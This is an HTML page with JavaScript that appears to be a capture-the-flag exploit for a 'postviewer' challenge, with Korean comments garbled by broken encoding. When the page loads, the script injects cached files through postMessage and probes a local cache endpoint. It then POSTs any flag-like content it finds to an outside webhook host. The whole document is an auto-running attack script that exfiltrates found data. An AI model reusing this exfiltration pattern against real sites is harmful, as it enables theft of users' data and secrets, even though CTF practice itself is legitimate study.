<!DOCTYPE html>
<html>
<head>
    <title>Simple Flag Steal</title>
</head>
<body>
    <h1>ğŸš© Simple Flag Extraction</h1>
    <div id="log"></div>

    <script>
        function log(msg) {
            document.getElementById('log').innerHTML += '<div>' + msg + '</div>';
            console.log(msg);
        }

        async function stealFlag() {
            log("ğŸ¯ Starting simple flag steal...");

            // 1. postMessageë¡œ cached=true íŒŒì¼ ì¶”ê°€
            const possibleFlags = [
                "CTF{dummy_flag}",
                "CTF{test_flag}",
                "CTF{postviewer_v5_pwned}",
                "flag{test}",
                // ë” ë§ì€ ê°€ëŠ¥í•œ í”Œë˜ê·¸ë“¤...
            ];

            for (const flag of possibleFlags) {
                const blob = new Blob([flag], { type: "text/plain" });
                
                window.postMessage({
                    type: "share",
                    files: [{
                        blob: blob,
                        cached: true,  // ğŸ¯ ì´ê²Œ í•µì‹¬!
                        name: "flag.txt",
                    }],
                }, "*");
                
                log(`ğŸ“¤ Added cached file: ${flag}`);
            }

            // 2. ìºì‹œëœ íŒŒì¼ë“¤ ì½ì–´ì˜¤ê¸°
            log("ğŸ” Reading cached files...");
            
            for (let i = 1; i <= 20; i++) {
                try {
                    const response = await fetch(`http://localhost:1338/?cache=${i}`);
                    if (response.ok) {
                        const content = await response.text();
                        log(`âœ… Cache ${i}: ${content}`);
                        
                        // í”Œë˜ê·¸ íŒ¨í„´ ì²´í¬
                        if (content.includes('CTF{') || content.includes('flag{')) {
                            log(`ğŸš© FLAG FOUND: ${content}`);
                            
                            // ì›¹í›…ìœ¼ë¡œ ì „ì†¡
                            fetch('https://yhnbdot.request.dreamhack.games', {
                                method: 'POST',
                                body: `FLAG: ${content}`
                            });
                        }
                    }
                } catch (error) {
                    log(`âŒ Cache ${i} failed: ${error.message}`);
                }
            }
        }

        // í˜ì´ì§€ ë¡œë“œ í›„ ì‹¤í–‰
        window.onload = function() {
            setTimeout(stealFlag, 2000);
        };
    </script>
</body>
</html>
